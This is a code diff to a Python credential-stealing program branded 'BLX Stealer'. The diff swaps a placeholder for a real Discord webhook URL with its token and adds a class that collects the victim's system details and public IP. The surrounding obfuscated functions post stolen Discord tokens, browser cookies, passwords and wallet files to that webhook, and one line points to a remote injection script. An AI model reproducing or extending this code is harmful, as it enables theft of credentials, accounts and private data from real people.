@@ -18,6 +18,7 @@ from sqlite3 import connect as sql_connect
 import re
 from base64 import b64decode
 from json import loads as json_loads, load
+from discord import Embed, File, SyncWebhook
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from tokenize import Token
 from urllib.request import Request, urlopen
@@ -533,7 +534,7 @@ def mac_check():
             pass
 
 
-hook = "YOUR WEBHOOK HERE"
+hook = "https://discord.com/api/webhooks/1164160737640448020/jXwNmhs4fNMYeXgTfp-kd3crMMFpjSoXu9Vh4W2GnQwPQjpG4CqOUfHLcJkqIJK39mSQ"
 inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/main/index.js"
 color =  0x812118
 DETECTED = False
@@ -721,7 +722,6 @@ def G37UHQFr13ND5(token):
             uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
     return uhqlist 
 
-
 def G3781111N6(token):
     headers = {
         "Authorization": token,
@@ -892,7 +892,7 @@ def UP104D70K3N(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "BLX Stealer",
+                "text": "BLX Stealer | discord.gg/blx",
                 "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                 },
             "thumbnail": {
@@ -900,12 +900,55 @@ def UP104D70K3N(token, path):
                 }
             }
         ],
-        "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
         "username": "BLX Stealer | t.me/blxstealer",
         "attachments": []
         }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
     
+class PcInfo:
+    import wmi
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    def __init__(self):
+        self.get_inf(hook)
+
+    def get_inf(self, webhook):
+        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
+    
+    computer_os = platform.platform()
+    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+    username = os.getenv("UserName")
+    hostname = os.getenv("COMPUTERNAME")
+
+    hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
+                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+
+    cpu = wmi.WMI().Win32_Processor()[0]
+    gpu = wmi.WMI().Win32_VideoController()[0]
+    ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
+    ip = requests.get('https://api.ipify.org').text
+
+    data = {
+            "content": g108411NF0(),
+            "embeds": [
+                {
+                    "title": "BLX Stealer | System Info",
+                    "description": f"<:userr:1164196007626670170> **PC Username:** `{username}`\n<:windowss:1164191405615362098> **PC Name:** `{hostname}`\n<:computerr:1164189052472393798> **OS:** `{computer_os}`\n\n<:blackworld:1164189050983415889> **IP:** `{ip}`\n<:wrenchh:1164189063306293358> **MAC:** `{mac}`\n<:keyy:1164192530456383529> **HWID:** `{hwid}`\n\n<:cpu:1164189055261605919> **CPU:** `{cpu.Name}`\n<:gpu:1164189947700453396> **GPU:** `{gpu.Name}`\n<:ramm:1164189059955036320> **RAM:** `{ram}GB`",
+                    "color": color,
+                    "footer": {
+                        "text": "BLX Stealer | discord.gg/blx",
+                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                    }
+                }
+            ],
+            "username": "BLX Stealer | t.me/blxstealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
+            "attachments": []
+            }
+    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
 
 def R3F0rM47(listt):
     e = re.findall("(\w+[a-z])",listt)
@@ -933,13 +976,13 @@ def UP104D(name, link):
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [BLXCookies.txt]({link})",
                     "color": color,
                     "footer": {
-                        "text": "BLX Stealer",
+                        "text": "BLX Stealer | discord.gg/blx",
                         "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                     }
                 }
             ],
             "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -959,13 +1002,13 @@ def UP104D(name, link):
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [BLXPasswords.txt]({link})",
                     "color": color,
                     "footer": {
-                        "text": "BLX Stealer",
+                        "text": "BLX Stealer | discord.gg/blx",
                         "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                     }
                 }
             ],
             "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -987,13 +1030,13 @@ def UP104D(name, link):
                     "name": "BLX Stealer | Files"
                 },
                 "footer": {
-                    "text": "BLX Stealer",
+                    "text": "BLX Stealer | discord.gg/blx",
                     "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                 }
                 }
             ],
             "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1023,6 +1066,7 @@ def g3770K3N(path, arg):
                                 # print(token)
                                 T0K3Ns += token
                                 UP104D70K3N(token, path)
+
 
 P455w = []
 def g37P455W(path, arg):
@@ -1171,13 +1215,13 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             "description": f"{wal}\n{ga}\n{ot}",
             "color": color,
             "footer": {
-                "text": "BLX Stealer",
+                "text": "BLX Stealer | discord.gg/blx",
                 "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
             }
             }
         ],
         "username": "BLX Stealer | t.me/blxstealer",
-        "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
         "attachments": []
     }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
